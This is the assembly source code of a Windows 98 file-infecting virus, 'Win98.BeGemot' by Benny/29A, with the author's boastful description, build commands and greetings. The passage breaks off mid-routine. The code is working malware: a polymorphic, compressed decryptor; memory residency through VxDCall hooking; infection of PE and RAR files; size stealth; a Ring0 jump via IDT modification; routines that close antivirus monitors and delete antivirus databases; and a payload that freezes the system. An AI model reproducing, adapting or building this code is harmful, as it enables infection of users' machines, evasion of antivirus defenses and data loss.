ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[bg.asm]ƒƒƒ
;                                                     ‹€€€€€‹ ‹€€€€€‹ ‹€€€€€‹
;                                                     €€€ €€€ €€€ €€€ €€€ €€€
;          Win98.BeGemot.8192                         ‹‹‹€€ﬂ  ﬂ€€€€€€ €€€€€€€
;          by Benny/29A                               €€€‹‹‹‹ ‹‹‹‹€€€ €€€ €€€
;                                                     €€€€€€€ €€€€€€ﬂ €€€ €€€
;                                                    
;
;
;Author's description
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;
;I'm very proud to introduce my best virus. I wanted to show ya in this virus,
;what everything I can. There aren't all my favourite techniques (such as
;Memory Mapped Files), nevertheless I think this is a good virus. I tried to
;optimize it as much as I could, but there is still for sure something, that
;could be optimized much more than it is. But that's a life... I call it
;Win98 infector coz I tested it only on my Win98 machine. It should work on
;Win95 also, but devil never sleeps. I'm not sure, so that's why I call it
;Win98. Hmmmm, okay, that was the foreword, and now here is that promised
;description...
;
;This virus is the Win98 resident/semi-stealth/compressed/slow poly/Pentium+/
;multithreaded/Ring3/Ring0/PE/RAR/fast infector. It also deletes some AV
;databases/killin some AV monitors/uses VxDCall0 backdoor to call DOS
;services/usin' undocumented opcode and can infect EXE/SCR/RAR/SFX/CPL/DAT/BAK
;files. It appends to last section in PE files/inserts Win9X dropper into RAR
;files and enlarge files with constant size, that's 8192 bytes. (I decided,
;this is perfect number, noone will mind.) It uses BPE32 (Benny's Polymorphic
;Engine for Win32, published in DDT#1) and BCE32 (published in 29A#4) engines.
;BPE32 has perfect SEH trick (it fools many AVs) and BCE32 saves about 1,9kB
;of virus code (!!!). Combination of these engines is my virus, that is (in
;this time - summer 1999) undetectable by any heuristic methods (only first
;generation of virus is detectable). I tested it with DrWeb (IMO the best AV),
;NODICE32 (IMO the second best), AVP (perfect scanner, but...) and many otherz.
;
;But that's not all. If virus will get resident in memory, virus will jump to
;Ring0, it create VMM thread (system thread) which will patch Ring3 code and so
;allow Ring3 code execution and leave Ring0. Ring3 code will run on, while
;thread will run in memory on the background. Thread will allocate 1kB of
;shared memory (memory accesible to all processes) and slowly check for
;changes in it. If any change will appear, thread will do property action,
;dependin' on change. Why? I coded next to BG communication console, called
;BGVCC (BeGemot Virus Communication Console), so if virus is resident in
;memory, u can easily communicate with virus thread by it. Look at BGVCC
;source and u will see, how can u easily communicate with/control virus.
;This is the first virus with communication interface.
;
;It also uses many trix to fool AVs, e.g. SEH, spec. thread, RETF etc...
;
;
;
;Vocabulary (these words r often used)
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;
;       BG        -     Win98.BeGemot, this virus.
;       BGVCC     -     BeGemot Virus Communication Console, utility included
;                       with this virus for controlin' BG and communicatin'
;                       with it.
;       BGCB      -     BeGemot Control Block. If u watch any system manual,
;                       u will see THCB (Thread Control Block), VMCB (Virtual
;                       Machine Control Block), etc. I decided, BGCB is rite
;                       abbreviation for callin' this, really system block.
;                       It holds all items, that r used to communicate with
;                       BG / BG thread.
;       BG thread -     VMM thread, which manages BGCB.
;
;
;
;What will happen on execution ?
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ-
;
;Virus will:
;1)	Decrypt it's body by polymorphic decryptor
;2)     Decompress virus body
;3)     Check, if it is already resident.
;4)     Try to find VxDCall0 API
;5)     Install virus to memory
;6)     Kill some AV monitors (AVP, NODICE)
;7)     Jump to host

;Virus in memory will:
;1)     Check requested service
;       -       size stealth stage (stealth and quit)
;       -       infection stage (continue)
;2)     Check filename
;3)     Jump to Ring0 (by modifyin' IDT)
;4)     Create new thread
;5)     Exit from Ring0
;6)     Infect file
;7)     Delete some AV files
;8)     Jump to previous handler
;
;
;
;AVP's description
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;
;Benny's notes: This is the worst description I have ever seen for so large
;virus as BeGemot is. U can see my notes in [* *]. Well, here is it:
;
;
;Win95.Begemot [* It's not fully compatible with Win95, but with Win98 only *]
;
;This is a dangerous [* why dangerous?! *] memory resident parasitic
;polymorphic Windows virus about 8Kb of length. The virus installs itself into
;the Windows memory [* shared memory! *] and infects PE EXE files [* and RAR
;files *] that are accessed. The virus uses system calls that are valid under
;Win95/98 only [* blah, some calls r valid only in Win98 *] and can't spread
;under NT. The virus also has bugs and often halts the system when run [* which
;one?! *]. The virus uses several unusual routines in its code: keeps its code
;encrypted and compressed in affected files (while installing it decompresses
;it); infects RAR archives (adds infected BEER.EXE file [* dropper! *] to
;archives); runs a thread that can communicate with external module [* u mean
;BGVCC? *] which controls the virus (for example, enables/disables infection
;routine) [* I thought u will talk much more about BGVCC *].
;
;The virus also looks for "AVP Monitor" and "Amon Antivirus Monitor" windows
;and closes them; deletes several anti-virus data files; depending on the
;system timer displays a message [* u forgot it or why u can't write here
;what message it is?! *].
;
;The virus also contains the "copyright" text: 
;
; Virus Win98.BeGemot by Benny/29A
;
;[* That's all about my 8kB virus, Kasperpig?! *]
;
;
;
;Payload
;ƒƒƒƒƒƒƒƒ
;
;Every execution virus test tick counter for 22h value. If matches, virus will
;display MessageBox.
;
;
;
;Greetz
;ƒƒƒƒƒƒƒ
;
;       Darkman/29A.... U said Amsterdam? Hmmm, prepare yourself for bath
;                       in the river :-)).
;       Super/29A...... w0rkoholic!
;       GriYo/29A...... So here is it with threads. HPS r0x, kewl tutes...
;                       Thanx for all...
;       Billy_Bel...... DDT#1 r0x0r, no lie! Maybe, ehrm... VX and politix,
;                       that ain't rite combination.
;       mgl............ .CZ/.SK RULEZ !!!
;       IntelServ...... Tell me, how is that feelin', when u know, that
;                       everybody hates u!
;       Kaspersky...... That's all u can?!
;
;
;
;How to build
;ƒƒƒƒƒƒƒƒƒƒƒƒƒ
;
;       tasm32 -ml -q -m9 bg.asm
;       tlink32 -Tpe -c -x -aa -r bg.obj,,, import32
;       pewrsec.com bg.exe
;
;
;
;For who is this dedicated?
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;
;I dunno yet. But I can say, for who ain't this virus dedicated. It ain't for
;ppl such as IntelServ, for jerx, for stupid ppl, for intolerate ppl, for
;any fanatic ppl (fascists, capitalistix and communists), for my teachers at
;school, for those, who can't use brain, for braggers. This virus is dedicated
;for SMART ppl, whoever is it, whatever is color of their skin, wherever is
;livin'. Important isn't GRADE, important is what u have in your HEAD!
;
;
;
;(c) 1999 Benny/29A. Enjoy!



.586p                                           ;why not ;)
.model flat                                     ;FLAT model

include mz.inc                                  ;include some important
include pe.inc                                  ;include-filez
include win32api.inc
include useful.inc


BG_IDLE         equ     0                       ;some equates
BG_INFECTINEXEC equ     1                       ;used
BG_INFECTINRAR  equ     2                       ;by communication
BG_STEALTHIN    equ     3                       ;thread

PC_WRITEABLE    equ     00020000h               ;equates used
PC_USER         equ     00040000h               ;in installation
PR_SHARED       equ     80060000h               ;stage
PC_PRESENT	equ	80000000h
PC_FIXED	equ	00000008h
PD_ZEROINIT	equ	00000001h

mem_size        equ     (virtual_end-Start+0fffh)/1000h ;size of virus in
                                                        ;memory (pages)

extrn ExitProcess:PROC                          ;used in first
                                                ;generation only

.data                                           ;data section
Start:                                          ;Start of virus
        pushad                                  ;save all regs
        call gd                                 ;get delta offset
gd:     pop ebp                                 ;...
        lea esi, [ebp + _compressed_ - gd]      ;where is compressed virus
                                                ;stored
        lea edi, [ebp + decompressed - gd]      ;where will be virus
                                                ;decompressed
        mov ecx, 12345678h                      ;size of compressed virus
c_size = dword ptr $ - 4                        


;Decompression routine from BCE32 starts here.
	pushad					;save all regs
	xor eax, eax				;EAX = 0
	xor ebp, ebp				;EBP = 0
	cdq					;EDX = 0
	lodsb					;load decryption key
	push eax				;store it
	lodsb					;load first byte
	push 8					;store 8
	push edx				;store 0
d_bits:	push ecx				;store ECX
	test al, 80h				;test for 1
	jne db0
	test al, 0c0h				;test for 00
	je db1
	test al, 0a0h				;test for 010
	je db2
	mov cl, 6				;its 011
	jmp tb2
testb:	test bl, 1				;is it 1 ?
	jne p1
	push 0					;no, store 0
_tb_:	mov eax, ebp				;load byte to EAX
	or al, [esp]				;set bit
	ror al, 1				;and make space for next one
	call cbit
	ret
p1:	push 1					;store 1
	jmp _tb_				;and continue
db0:	xor cl, cl				;CL = 0
	mov byte ptr [esp+4], 1			;store 1
testbits:
	push eax				;store it
	push ebx				;...
	mov ebx, [esp+20]			;load parameter
	ror bl, cl				;shift to next bit group
	call testb				;test bit
	ror bl, 1				;next bit
	call testb				;test it
	pop ebx					;restore regs
	pop eax
	mov ecx, [esp+4]			;load parameter
bcopy:	cmp byte ptr [esp+8], 8			;8. bit ?
	jne dnlb				;nope, continue
	mov ebx, eax				;load next byte
	lodsb
	xchg eax, ebx
	mov byte ptr [esp+8], 0			;and nulify parameter
	dec dword ptr [esp]			;decrement parameter
dnlb:	shl al, 1				;next bit
	test bl, 80h				;is it 1 ?
	je nb					;no, continue
	or al, 1				;yeah, set bit
nb:	rol bl, 1				;next bit
	inc byte ptr [esp+8]			;increment parameter
	loop bcopy				;and align next bits
	pop ecx					;restore ECX
	inc ecx					;test flags
	dec ecx					;...
	jns d_bits				;if not sign, jump
	pop eax					;delete pushed parameters
	pop eax					;...
	pop eax					;...
	popad					;restore all regs
	jmp decompressed
cbit:	inc edx					;increment counter
	cmp dl, 8				;byte full ?
	jne n_byte				;no, continue
	stosb					;yeah, store byte
	xor eax, eax				;and prepare next one
	cdq					;...
n_byte:	mov ebp, eax				;save back byte
	ret Pshd		;quit from procedure with one parameter on stack
db1:	mov cl, 2				;2. bit in decryption key
        mov [esp+4], cl                         ;2 bit wide
	jmp testbits				;test bits
db2:	mov cl, 4				;4. bit
tb2:	mov byte ptr [esp+4], 3			;3 bit wide
	jmp testbits				;test bits

_compressed_    db      1a00h dup (?)           ;here is stored compressed
                                                ;virus body
decompressed:   db      virus_end-compressed dup (?)  ;here decompressed
                db      size_unint dup (?)      ;and here all uninitialized
                                                ;variables
virtual_end:                                    ;end of virus in memory
ends

.code                                           ;code section
first_gen:                                      ;first generation code
        mov esi, offset compressed              ;source
        mov edi, offset _compressed_            ;destination
        mov ecx, virus_end-compressed+2         ;size
        mov ebx, offset workspace1              ;workspace1
        mov edx, offset workspace2              ;workspace2
        call BCE32_Compress                     ;Compress virus body!
        dec eax
        mov [c_size], eax                       ;save compressed virus size
        jmp Start                               ;jmp to virus


;Compression routine from BCE32 starts here. This is used only in first gen.

BCE32_Compress  Proc
	pushad					;save all regs
;stage 1
	pushad					;and again
create_table:
	push ecx				;save for l8r usage
	push 4
	pop ecx					;ECX = 4
	lodsb					;load byte to AL
l_table:push eax				;save it
	xor edx, edx				;EDX = 0
	and al, 3				;this stuff will separate and test
	je st_end				;bit groups
	cmp al, 2
	je st2
	cmp al, 3
	je st3
st1:	inc edx					;01
	jmp st_end
st2:	inc edx					;10
	inc edx
	jmp st_end
st3:	mov dl, 3				;11
st_end:	inc dword ptr [ebx+4*edx]		;increment count in table
	pop eax
	ror al, 2				;next bit group
	loop l_table
	pop ecx					;restore number of bytes
	loop create_table			;next byte

	push 4					;this will check for same numbers
	pop ecx					;ECX = 4
re_t:	cdq					;EDX = 0
t_loop:	mov eax, [ebx+4*edx]			;load DWORD
	inc dword ptr [ebx+4*edx]		;increment it
	cmp eax, [ebx]				;test for same numbers
	je _inc_				;...
	cmp eax, [ebx+4]			;...
	je _inc_				;...
	cmp eax, [ebx+8]			;...
	je _inc_				;...
	cmp eax, [ebx+12]			;...
	jne ninc_				;...
_inc_:	inc dword ptr [ebx+4*edx]		;same, increment it
	inc ecx					;increment counter (check it in next turn)
ninc_:	cmp dl, 3				;table overflow ?
	je re_t					;yeah, once again
	inc edx					;increment offset to table
	loop t_loop				;loop
	popad					;restore regs

;stage 2
	pushad					;save all regs
	mov esi, ebx				;get pointer to table
	push 3
	pop ebx					;EBX = 3
	mov ecx, ebx				;ECX = 3
rep_sort:					;bubble sort = the biggest value will
						;always "bubble up", so we know number
						;steps
	push ecx				;save it
	mov ecx, ebx				;set pointerz
	mov edi, edx				;...
	push edx				;save it
	lodsd					;load DWORD (count)
	mov edx, eax				;save it
sort:	lodsd					;load next
	cmp eax, edx				;is it bigger
	jb noswap				;no, store it
	xchg eax, edx				;yeah, swap DWORDs
noswap:	stosd					;store it
	loop sort				;next DWORD
	mov eax, edx				;biggest in EDX, swap it
	stosd					;and store
	lea esi, [edi-16]			;get back pointer
	pop edx					;restore regs
	pop ecx
	loop rep_sort				;and try next DWORD
	popad
;stage 3
	pushad					;save all regs
	xor eax, eax				;EAX = 0
	push eax				;save it
	push 4
	pop ecx					;ECX = 4
n_search:
	push edx				;save regs
	push ecx
	lea esi, [ebx+4*eax]			;get pointer to table
	push eax				;store reg
	lodsd					;load DWORD to EAX
	push 3
	pop ecx					;ECX = 3
	mov edi, ecx				;set pointerz
search:	mov esi, edx
	push eax				;save it
	lodsd					;load next
	mov ebp, eax
	pop eax
	cmp eax, ebp				;end ?
	je end_search
	dec edi					;next search
	sub edx, -4
	loop search
end_search:
	pop eax					;and next step
	inc eax
	pop ecx
	pop edx
	add [esp], edi
	rol byte ptr [esp], 2
	loop n_search
	pop [esp.Pushad_ebx]			;restore all
	popad					;...
;stage 4
	xor ebp, ebp				;EBP = 0
	xor edx, edx				;EDX = 0
	mov [edi], bl				;store decryption key
	inc edi					;increment pointer
next_byte:
	xor eax, eax				;EAX = 0
	push ecx
	lodsb					;load next byte
	push 4
	pop ecx					;ECX = 4
next_bits:
	push ecx				;store regs
	push eax
	and al, 3				;separate bit group
	push ebx				;compare with next group
	and bl, 3
	cmp al, bl
	pop ebx
	je cb0
	push ebx				;compare with next group
	ror bl, 2
	and bl, 3
	cmp al, bl
	pop ebx
	je cb1
	push ebx				;compare with next group
	ror bl, 4
	and bl, 3
	cmp al, bl
	pop ebx
	je cb2
	push 0					;store bit 0
	call copy_bit
	push 1					;store bit 1
	call copy_bit
cb0:	push 1					;store bit 1
end_cb1:call copy_bit
	pop eax
	pop ecx
	ror al, 2
	loop next_bits				;next bit
	pop ecx
	loop next_byte				;next byte
	mov eax, edi				;save new size
	sub eax, [esp.Pushad_edi]		;...
	mov [esp.Pushad_eax], eax		;...
	popad					;restore all regs
	cmp eax, ecx				;test for negative compression
	jb c_ok					;positive compression
	stc					;clear flag
	ret					;and quit
c_ok:	clc					;negative compression, set flag
	ret					;and quit
cb1:	push 0					;store bit 0
end_cb2:call copy_bit
	push 0					;store bit 0
	jmp end_cb1
cb2:	push 0					;store bit 0
	call copy_bit
	push 1					;store bit 1
	jmp end_cb2
copy_bit:
	mov eax, ebp				;get byte from EBP
	shl al, 1				;make space for next bit
	or al, [esp+4]				;set bit
	jmp cbit
BCE32_Compress	EndP				;end of compression procedure


compressed:                                     ;compressed body starts here
        @SEH_SetupFrame <jmp quit_payload>      ;setup SEH frame
        db      0d6h                            ;undoc. opcode SALC
                                                ;used only to fool AVs
        call gdelta                             ;calculate delta offset
gdelta:	pop ebp
        mov ebx, 0bff70000h                     ;base address of K32 (95/98)
        mov eax, [ebx.MZ_lfanew]                ;get ptr to PE
        add eax, ebx                            ;make it raw ptr
	mov edi, [eax.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
        add edi, ebx                            ;get virtual address of ET
        mov esi, [edi.ED_AddressOfFunctions]    ;get start address of exported
        add esi, ebx                            ;functions

        xor edx, edx                            ;EDX=0
l_addr: cmp edx, [edi.ED_NumberOfFunctions]     ;end of functions addresses?
        jnb end_host                            ;yeah, jump to host
        push 7                                  
        pop ecx                                 ;ECX=7
l_func: inc edx                                 ;EDX++
        lodsd                                   ;load dword
        cmp eax, [esi]                          ;addresses equal?
        jne l_addr                              ;no, next function
        loop l_func                             ;yeah, next check
        add eax, ebx                            ;make it raw ptr
        mov [ebp + VxDCall0 - gdelta], eax      ;and save address of VxDCall0
        xchg eax, esi                           ;EAX <=> ESI

        xor eax, eax                            ;residency check
        mov ah, 2ah                             ;get system time
        mov edi, '!BG!'                         ;our sign
        call int21h                             ;call int21h dispatcher
        cmp esi, 1982                           ;already resident?
        je end_host                             ;yeah, jump to host

        push PC_WRITEABLE or PC_USER            ;now we will reserve memory
        push mem_size                           ;for our virus body in shared
        push PR_SHARED                          ;area of virtual memory, so it
        push 00010000h                          ;will be visible for all
        call [ebp + VxDCall0 - gdelta]          ;processes
        inc eax                                 ;error ?
        je end_host                             ;yeah, jump to host
        dec eax                                 ;no, continue
        mov ebx, eax                            ;save address to EBX register
        cmp eax, 80000000h                      ;is it in shared area ?
        jb pg_free                              ;no, free pages and quit
        mov [ebp + mem_addr - gdelta], eax      ;save address

	push PC_WRITEABLE or PC_USER or PC_PRESENT or PC_FIXED
        push 0                                  ;now we will commit
        push PD_ZEROINIT                        ;physical space for our
        push mem_size                           ;reserved pages.
	shr eax, 0ch
	push eax
	push 00010001h
	call [ebp + VxDCall0 - gdelta]
        xchg eax, ecx                           ;error ?
        jecxz pg_free                           ;yeah, free pages and quit

        push ebx                                ;save address
        sub ebx, compressed-VxDCall_addr-(decompressed-Start)
        mov [ebp + jump_loc - gdelta], ebx      ;store handler location

        mov ecx, 100h                           ;now we will search for
vxdloop:lodsb                                   ;call instruction
        cmp al, 2eh                             ;is it "CS:" selector override?
        jne vxdnext                             ;no, next byte
        cmp word ptr [esi], 1dffh               ;and is it our instruction?
        je got_ptr                              ;yeah, we got ptr to memory
vxdnext:loop vxdloop                            ;no, next try

        pop ebx                                 ;EBX=address our pages
pg_free:push 0                                  ;shit, address not found,
        push ebx                                ;we have to free pages
        push 0001000ah                          ;and jump to host
        call [ebp + VxDCall0 - gdelta]          ;free pages call
        jmp end_host                            ;(((

got_ptr:mov edi, [esp]                          ;get address of our pages
        pushad                                  ;save all registers
        lea esi, [ebp + compressed-gdelta-(decompressed-Start)]
        mov ecx, (virtual_end-Start+3)/4        ;copy virus to shared memory
        rep movsd                               ;...
        popad                                   ;restore all registers

        cli                                     ;exclusive execution
        inc esi                                 ;skip instruction
	inc esi
        lodsd                                   ;load address from instruction
        push eax                                ;store it
        xchg eax, esi                           ;ESI=address
        mov edi, ebx                            ;EDI=original address of address
	push 6
        pop ecx                                 ;ECX=6
        rep movsb                               ;save original 48bit address
        pop edi                                 ;restore address
        pop eax                                 ;get ptr to shared memory
        sub eax, compressed-VxDCall_hook-(decompressed-Start)
        stosd                                   ;store address of our handler
        mov eax, cs                             ;+selector
        stosw                                   ;store selector
        sti                                     ;nonexclusive execution...

end_host:
        in al, 40h                              ;is it rite time to activate
        cmp al, 22                              ;our payload?
        je do_payload                           ;yeah

        lea esi, [ebp + ShItTyMoNs - gdelta]    ;no, but lets kill some
        xor edi, edi                            ;AV monitors
	push 2
        pop ecx                                 ;2 monitors
KiLlMoNs:
	push ecx
	push esi
	push edi
        call [ebp + FndWndA - gdelta]           ;find window
        test eax, eax                           ;found?
        je next_mon                             ;no, try to kill other monitor
        push edi                                ;now we will send message
        push edi                                ;to AV window to kill itself
        push 12h                                ;veeeeeeery stupid X-DD
	push eax
        call [ebp + PstMsgA - gdelta]           ;bye bye, hahaha
next_mon:
        add esi, 0ch                            ;next monitor string
	pop ecx
        loop KiLlMoNs                           ;kill another one

quit_payload:
        @SEH_RemoveFrame                        ;remove SEH frame
        popad                                   ;restore all regs
        push cs                                 ;now we will use FAR return
        db      0a1h                            ;trick to fool some stupid
        dd 400002h.MZ_res2                      ;heuristic scanners. Heh, who
        sub eax, -400000h                       ;could expect someone will
        push eax                                ;FAR return in flat model, heh
        retf                                    ;jump to host

do_payload:                                     ;time for our payload
        push 1000h                              ;system modal window
        call szTitle                            ;title of window
sztt    db      "Virus Win98.BeGemot by Benny/29A", 0

ShItTyMoNs:
	db	'AVP Monitor', 0
	db	'Amon Antivirus Monitor', 0

szTitle:call szText                             ;text of window
sztx    db      'Wait a minute,',0dh,0dh
        db      'Micro$h!t is everywhere u want to be...',0dh
        db      'Please call Micro$h!t on-line help, if u have any problems.',0dh
        db      'Don''t u have a telephone? So call your system supervisor.',0dh
        db      'R u supervisor? So call Micro$h!t on-line help...',0dh
	db	'Ehrm, well... where do u want to go y3st3rday?',0dh,0dh
        db      'PS: Your problem ain''t virus. Micro$h!t didn''t certified', 0dh
	db	'this hardware, buy a new one...',0dh
	db	'Press OK button to solve this problem by Micro$h!t...',0
MsgBxA	dd      0bff5412eh
FndWndA	dd	0bff5590ch
PstMsgA	dd	0bff556fch

szText: push 0                                  ;HWnd=0
        call [ebp + MsgBxA - gdelta]            ;display message box
        cli                                     ;fuck all preemptives
FuckThemAll:
        jmp FuckThemAll                         ;infinite loop. System wont
                                                ;switch to another process ;)
write_something:                                ;WriteToFile procedure
        mov ah, 40h                             ;Write to file service
        jmp int21h                              ;call int21h

read_something:                                 ;ReadFromFile procedure
        lea edx, [ebp + header - mgdelta]       ;to header variable
r_something:                                    ;ReadFromFile procedure2
        mov ah, 3fh                             ;service number
int21h: push ecx                                ;push parameters
	push eax
        push 002a0010h                          ;service number to VMM
ipatch: jmp int21                               ;call int21h

rint21: call [ebp + VxDCall0 - mgdelta]         ;resident version of int21h
	ret
int21:  call [ebp + VxDCall0 - gdelta]          ;runtime version of int21h
	ret
        
;AV filez born to be deleted
ShItTyFiLeZ:    db      'DRWEBASE.VDB', 0       ;ByE-kAsPeRsKy
                db      'NOD32.000', 0          ;ByE-tRnKa
                db      'AVG.AVI', 0            ;ByE-oDeHnAl
                db      'ANTI-VIR.DAT', 0       ;ByE-tBaV
                db      'AVP.CRC', 0            ;ByE-aVp

RARHeader:                                      ;No comment ;)
RARHeaderCRC	dw	0
RARType		db	74h
RARFlags	dw	8000h
RARHSize        dw      end_RAR-RARHeader
RARCompressed	dd	3000h
RAROriginal	dd	3000h
RAROS		db	0
RARCRC32	dd	0
RARFileDateTime dd      12345678h
RARNeedVer	db	14h
RARMethod	db	30h
RARFNameSize    dw      end_RAR-RARName
RARAttrib	dd	0
RARName		db	'BEER.EXE'
end_RAR:

last_test:
        cmp ah, 2ah                             ;Get system time?
        jne exit_infection                      ;no, back to original handler
        cmp edi, '!BG!'                         ;our sign?
        jne exit_infection                      ;no, back to orig. handler
        popad                                   ;restore all registers
        mov esi, 1982                           ;mark this
        jmp farjmp                              ;and quit

VxDCall_hook	proc				;VXDCall hooker starts here
	pushad					;save all regs
	call mgdelta				;get delta offset
mgdelta:pop ebp
	xor ecx, ecx				;ECX=0
        mov cl, 1                               ;CL=semaphore
semaphore = byte ptr $ - 1
        jecxz quit_hook                         ;we wont trace our calls

        cmp eax, 002a0010h                      ;int21h dispatch service?
        jne quit_hook                           ;no, quit

        mov eax, [esp+2ch]                      ;get service number

	cmp ah, 3dh				;Open file ?
	je infect
	cmp ah, 43h				;Get/Set attributes
	je infect
	cmp ax, 6c00h				;Extended Create/Open
	je infct2
	cmp ah, 71h				;any LFN service ?
	jne last_test
	cmp al, 43h				;Extended Get/Set attributes ?
	je infect
	cmp al, 4eh				;LFN find first file
	je stealth
	cmp al, 4fh				;LFN find next file
	je stealth
	cmp al, 56h				;LFN rename file
	je infect
	cmp al, 6ch				;LFN extended open
	je infct2
	cmp al, 0a8h				;LFN short name
	je infct2

exit_infection:
        mov byte ptr [ebp + semaphore - mgdelta], 1        ;set semaphore
        mov byte ptr [ebp + v_state - mgdelta], BG_IDLE    ;set virus state
quit_hook:
        popad                                              ;restore all regs
farjmp: jmp fword ptr cs:[12345678h]                       ;and jump to
jump_loc = dword ptr $ - 4                                 ;previous handler

s_int21h:                                                  ;int21h for stealth
        push ecx                                           ;function
	push eax
	push 002a0010h
	call [ebp + VxDCall0 - sgdelta]
	ret

stealth:                                       ;stealthin function starts here
        mov byte ptr [ebp + v_state - mgdelta], BG_STEALTHIN ;set virus state

        push dword ptr [esp+28h]                ;now we will call property
        pop dword ptr [ebp + s_ret - mgdelta]   ;function and get result           
	lea eax, [ebp + api_ret - mgdelta]
        mov [esp+28h], eax                      ;set return address

        mov [ebp + find_data - mgdelta], edi    ;save ptr to WIN32FINDDATA
        jmp quit_hook                           ;and call prev. handler

api_ret:jc b2caller                             ;return and get results
        pushad                                  ;get delta offset
	call sgdelta
sgdelta:pop ebp

        mov edi, 12345678h                      ;get WIN32FINDDATA
find_data = dword ptr $ - 4

	lea esi, [edi.WFD_szFileName]
	push esi
        call c_name                             ;check filename
	pop esi
        jc quit_stealth                         ;error, quit stealth

        mov byte ptr [ebp + semaphore - sgdelta], 0      ;set semaphore
        mov eax, 716ch                          ;Extended Open/Create file
        xor ebx, ebx                            ;flags
        xor ecx, ecx                            ;attributes
        cdq                                     ;action
        inc edx                                 ;...
        call s_int21h                           ;call it
        jc quit_stealth                         ;error?
	xchg eax, ebx

        mov ah, 3fh                             ;read DOS MZ header
	push IMAGE_SIZEOF_DOS_HEADER
	pop ecx
	lea edx, [ebp + header - sgdelta]
        call s_int21h                           ;...
	jc s_close

        cmp word ptr [ebp + header.MZ_res2 - sgdelta], 29ah  ;is it infected
        jne s_close                             ;no, quit
        add dword ptr [edi.WFD_nFileSizeLow], -2000h   ;yeah, return original
                                                       ;size

s_close:mov ah, 3eh                             ;close file
	call s_int21h
quit_stealth:
        mov byte ptr [ebp + semaphore - sgdelta], 1    ;set semaphore
        popad                                   ;restore all regs
        clc                                     ;clear carry
b2caller:
        push 12345678h                          ;and jump back
s_ret = dword ptr $ - 4                         ;to host program
        ret                                     ;...

EnterRing0:                                     ;Ring0 port
        pop eax                                 ;get address
        pushad                                  ;save all registers
        pushad                                  ;and again
        sidt fword ptr [esp-2]                  ;load 6byte long IDT address
        popad                                   ;restore registers
        sub edi, -(8*3)                         ;move to int3
        push dword ptr [edi]                    ;save original IDT
        stosw                                   ;modify IDT
        inc edi                                 ;move by 2
        inc edi                                 ;...
        push dword ptr [edi]                    ;save original IDT
        push edi                                ;save pointer
        mov ah, 0eeh                            ;IDT FLAGs
        stosd                                   ;save it
        mov ebx, cs                             ;fill registers with
        mov ecx, ds                             ;selectors for l8r use
        mov esi, es                             ;...
        mov edi, ss                             ;...
        push ds                                 ;save some selectors
        push es                                 ;...
        int 3                                   ;JuMpToRiNg0!
        pop es                                  ;restore selectors
        pop ds                                  ;...
        pop edi                                 ;restore ptr
        add edi, -4                             ;move with ptr
        pop dword ptr [edi+4]                   ;and restore IDT
        pop dword ptr [edi]                     ;...
p_jmp:  inc eax                                 ;some silly loop to fool
        cdq                                     ;some AVs. Will be overwritten
        jmp p_jmp                               ;with NOPs l8r by new thread
        popad                                   ;restore all regs
        jmp LeaveRing0                          ;and leave procedure

Thread Proc                                     ;thread procedure start here
        call tgdelta                            ;get delta offset
tgdelta:pop ebp
        mov [ebp + p_jmp - tgdelta], 90909090h  ;overwrite silly loop by NOPs

        push PC_WRITEABLE or PC_USER            ;reserve one page
        push 1                                  ;in shared memory
        push PR_SHARED                          ;for BGCB
        push 00010000h                          ;...
        call [ebp + VxDCall0 - tgdelta]         ;...
	inc eax
        je t_sleep                              ;error?
	dec eax
        cmp eax, 80000000h                      ;is it in shared memory ?
	jb free_pg
        mov ebx, eax                            ;save address

	push PC_WRITEABLE or PC_USER or PC_PRESENT or PC_FIXED
        push 0                                  ;and now we will commit
        push PD_ZEROINIT                        ;physical space in memory
        push 1                                  ;...
        shr eax, 0ch                            ;...
        push eax                                ;...
        push 00010001h                          ;...
        call [ebp + VxDCall0 - tgdelta]         ;...
        test eax, eax                           ;if error, free pages
        je free_pg                              ;and quit

;some equates for BGCB

BGCB_Signature  equ     00                      ;BGCB signature ('BGCB')
BGCB_New        equ     04                      ;new request (1-new, 0 not)
BGCB_ID         equ     08                      ;ID of request
BGCB_Data       equ     12                      ;property data

                                                ;EAX=1, ECX=0
        mov [ebx.BGCB_Signature], 'BCGB'        ;set signature
t_rep:  call t_sleep                            ;sleep for some ms
        cli                                     ;exclusive execution
        cmp [ebx.BGCB_New], ecx                 ;anything new?
        je t_end                                ;no
        mov [ebx.BGCB_New], ecx                 ;yeah, nulify item
        mov edx, [ebx.BGCB_ID]                  ;and check ID
        test edx, edx                           ;0?
        je p_test                               ;virus presency check
        dec edx                                 ;1?
        je i_test                               ;virus state checkin'
        dec edx                                 ;2?
        je d_test                               ;disable virus actions
        dec edx                                 ;3?
        je e_test                               ;enable virus actions
        dec edx                                 ;4?
        je g_test                               ;get sleep time
        dec edx                                 ;5?
        je si_test                              ;increase sleep time
        dec edx                                 ;6?
        je sd_test                              ;decrease sleep time
        dec edx                                 ;7?
        je k_test                               ;system halt
        dec edx                                 ;8?
        je ds_test                              ;disconnect
t_end:  sti                                     ;allow INTs
        jmp t_rep                               ;and sleep

p_test: mov [ebx.BGCB_Data], eax                ;set BGCB data to 1
	jmp t_end

i_test: mov byte ptr [ebx.BGCB_Data], 0         ;set BGCB data to v_state
v_state = byte ptr $ - 1
	jmp t_end

d_test:	mov word ptr [ebp + VxDCall_hook - tgdelta], 0ebh+((farjmp-VxDCall_hook-2)shl 8)
        jmp t_end                               ;construct JMP to end

e_test:	mov word ptr [ebp + VxDCall_hook - tgdelta], 0e860h
        jmp t_end                               ;reconstruct original bytes

g_test: mov edx, [ebp + sleep_t - tgdelta]      ;get sleep time
        mov [ebx.BGCB_Data], edx                ;store it in BGCB data
	jmp t_end

si_test:mov edx, [ebx.BGCB_Data]                ;get increment
